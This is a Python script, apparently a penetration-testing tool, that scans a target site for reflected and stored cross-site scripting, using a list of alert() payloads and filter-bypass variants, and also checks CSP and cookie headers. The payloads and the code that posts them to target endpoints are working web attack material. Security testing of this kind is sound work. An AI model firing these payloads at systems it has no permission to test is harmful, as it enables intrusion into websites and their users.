#!/usr/bin/env python3
"""Agent for testing Cross-Site Scripting (XSS) vulnerabilities during authorized assessments."""

import requests
import re
import json
import sys
import argparse
import urllib3
from datetime import datetime
from urllib.parse import urljoin, quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

XSS_PAYLOADS = {
    "html_body": [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<body onload=alert(1)>',
    ],
    "html_attribute": [
        '" onfocus=alert(1) autofocus="',
        '" onmouseover=alert(1) "',
        '"><script>alert(1)</script>',
        "' onfocus=alert(1) autofocus='",
    ],
    "javascript_context": [
        "';alert(1)//",
        "\\';alert(1)//",
        "</script><script>alert(1)</script>",
    ],
    "filter_bypass": [
        '<ScRiPt>alert(1)</sCrIpT>',
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<svg/onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
    ],
}

CANARY = "xsscanary7391"


def detect_reflection_context(response_text, canary):
    """Determine the rendering context of reflected input."""
    contexts = []
    if f">{canary}<" in response_text or f">{canary} " in response_text:
        contexts.append("html_body")
    if f'="{canary}"' in response_text or f"='{canary}'" in response_text:
        contexts.append("html_attribute")
    if f"'{canary}'" in response_text or f'"{canary}"' in response_text:
        if "<script>" in response_text.lower():
            contexts.append("javascript_context")
    if f'href="{canary}' in response_text or f"href='{canary}" in response_text:
        contexts.append("url_context")
    return contexts if contexts else ["html_body"]


def test_reflected_xss(base_url, params, token=None):
    """Test URL parameters for reflected XSS."""
    print("\n[*] Testing reflected XSS...")
    findings = []
    headers = {}
    if token:
        headers["Authorization"] = f"Bearer {token}"

    for param_url in params:
        url = urljoin(base_url, param_url)
        canary_url = url.replace("FUZZ", CANARY)
        try:
            resp = requests.get(canary_url, headers=headers, timeout=10, verify=False)
            if CANARY not in resp.text:
                continue
            contexts = detect_reflection_context(resp.text, CANARY)
            print(f"  [+] Reflection found at {param_url} (contexts: {contexts})")
            char_test_url = url.replace("FUZZ", '<>"\'&/')
            char_resp = requests.get(char_test_url, headers=headers, timeout=10, verify=False)
            unencoded = []
            for ch in ['<', '>', '"', "'", '/']:
                if ch in char_resp.text and f"&{ch}" not in char_resp.text:
                    unencoded.append(ch)

            for context in contexts:
                payloads = XSS_PAYLOADS.get(context, XSS_PAYLOADS["html_body"])
                for payload in payloads:
                    test_url = url.replace("FUZZ", quote(payload))
                    try:
                        test_resp = requests.get(test_url, headers=headers, timeout=10, verify=False)
                        if payload in test_resp.text or payload.lower() in test_resp.text.lower():
                            findings.append({
                                "type": "REFLECTED_XSS", "url": param_url,
                                "payload": payload, "context": context,
                                "severity": "HIGH",
                            })
                            print(f"  [!] XSS CONFIRMED: {param_url} | payload: {payload[:50]}")
                            break
                    except requests.RequestException:
                        continue
        except requests.RequestException:
            continue
    return findings


def test_stored_xss(base_url, submit_endpoint, display_endpoint, token, field="body"):
    """Test stored XSS via form submission."""
    print(f"\n[*] Testing stored XSS on {submit_endpoint}...")
    findings = []
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    submit_url = urljoin(base_url, submit_endpoint)
    display_url = urljoin(base_url, display_endpoint)

    for payload_type, payloads in XSS_PAYLOADS.items():
        for payload in payloads[:2]:
            marker = f"XSS-{payload_type}-{hash(payload) % 10000}"
            tagged_payload = f"{marker}:{payload}"
            try:
                resp = requests.post(submit_url, headers=headers,
                                     json={field: tagged_payload}, timeout=10, verify=False)
                if resp.status_code in (200, 201):
                    display_resp = requests.get(display_url, headers=headers,
                                                timeout=10, verify=False)
                    if payload in display_resp.text:
                        findings.append({
                            "type": "STORED_XSS", "submit": submit_endpoint,
                            "display": display_endpoint, "payload": payload,
                            "severity": "CRITICAL",
                        })
                        print(f"  [!] STORED XSS: {payload[:50]}")
                        break
            except requests.RequestException:
                continue
    return findings


def check_csp_header(base_url):
    """Analyze Content Security Policy header for XSS protection."""
    print(f"\n[*] Checking CSP header on {base_url}...")
    findings = []
    try:
        resp = requests.get(base_url, timeout=10, verify=False)
        csp = resp.headers.get("Content-Security-Policy", "")
        xxp = resp.headers.get("X-XSS-Protection", "")

        if not csp:
            findings.append({"type": "NO_CSP", "severity": "MEDIUM"})
            print("  [!] No Content-Security-Policy header")
        else:
            print(f"  [+] CSP: {csp[:100]}...")
            if "unsafe-inline" in csp:
                findings.append({"type": "CSP_UNSAFE_INLINE", "severity": "HIGH"})
                print("  [!] CSP allows 'unsafe-inline'")
            if "unsafe-eval" in csp:
                findings.append({"type": "CSP_UNSAFE_EVAL", "severity": "HIGH"})
                print("  [!] CSP allows 'unsafe-eval'")
            if "*" in csp:
                findings.append({"type": "CSP_WILDCARD", "severity": "MEDIUM"})
                print("  [!] CSP contains wildcard domains")

        if not xxp:
            print("  [INFO] No X-XSS-Protection header (deprecated)")
        cookie_headers = resp.headers.get("Set-Cookie", "")
        if cookie_headers and "httponly" not in cookie_headers.lower():
            findings.append({"type": "COOKIE_NO_HTTPONLY", "severity": "MEDIUM"})
            print("  [!] Session cookie missing HttpOnly flag")
    except requests.RequestException as e:
        print(f"  [-] Error: {e}")
    return findings


def generate_report(findings, output_path):
    """Generate XSS assessment report."""
    report = {
        "assessment_date": datetime.now().isoformat(),
        "total_findings": len(findings),
        "by_type": {},
        "findings": findings,
    }
    for f in findings:
        t = f.get("type", "UNKNOWN")
        report["by_type"][t] = report["by_type"].get(t, 0) + 1
    with open(output_path, "w") as fh:
        json.dump(report, fh, indent=2)
    print(f"\n[*] Report: {output_path} | Findings: {len(findings)}")


def main():
    parser = argparse.ArgumentParser(description="XSS Vulnerability Testing Agent")
    parser.add_argument("base_url", help="Base URL of the target")
    parser.add_argument("--token", help="Bearer token for authenticated testing")
    parser.add_argument("--params", nargs="+", default=["/search?q=FUZZ", "/page?name=FUZZ"])
    parser.add_argument("--submit-endpoint", help="Endpoint to submit stored XSS")
    parser.add_argument("--display-endpoint", help="Endpoint where stored input is displayed")
    parser.add_argument("-o", "--output", default="xss_report.json")
    args = parser.parse_args()

    print(f"[*] XSS Vulnerability Assessment: {args.base_url}")
    findings = []
    findings.extend(check_csp_header(args.base_url))
    findings.extend(test_reflected_xss(args.base_url, args.params, args.token))
    if args.submit_endpoint and args.display_endpoint:
        findings.extend(test_stored_xss(args.base_url, args.submit_endpoint,
                                         args.display_endpoint, args.token))
    generate_report(findings, args.output)


if __name__ == "__main__":
    main()
